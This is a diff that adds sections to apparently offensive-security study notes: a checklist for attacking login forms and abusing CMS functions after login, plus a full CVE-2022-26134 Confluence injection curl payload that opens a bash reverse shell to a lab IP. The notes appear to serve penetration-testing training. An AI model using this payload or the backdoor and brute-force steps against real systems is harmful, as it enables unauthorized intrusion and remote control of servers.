@@ -347,3 +347,29 @@ Whenever encoding and decoding a reverse shell in base 64, remove the special ch
 
 This can overcome rules that don’t allow for spaces. 
 
+#### Login Forms
+
+When you run into login forms, think SQLi, Code injection, error-message username enumeration, search default credentials, brute-forcing with hydra/wfuzz, search web for exploits, SSTIs, custom wordlists with cewl.
+
+#### Once Logged In
+
+Assess the functionality provided to us and see if we can abuse it.
+
+Look for service versions (exploit-db), abusing file-upload vulnerability, user privileges may be able to be changed, code execution directly in a new post/page, look for modules, extensions & addons or create your own with backdoors, look for a downgrade attack on the target machine/cms, edit some pre-existing extension or functionality to plant executable code, look for interesting data, credentials
+
+#### Using Public Exploits
+
+It's important to at least psyeudo understand the payload that you are using, if nothing else, to make sure that it works on your end. For example, CVE-2022-26134 for Confluence uses the following payload:
+
+```bash
+curl -v http://192.168.219.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.232/1270%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+
+If you didn't study the payload, you wouldn't see the there are certain characters in the payload that *aren't* url endcoded. These characters are like this for a reason. You can extrapolate to many other payloads. 
+
+#### Find and Kill Process Running on a Port
+
+```bash
+sudo lsof -i :2345
+kill -9 <PID>
+```
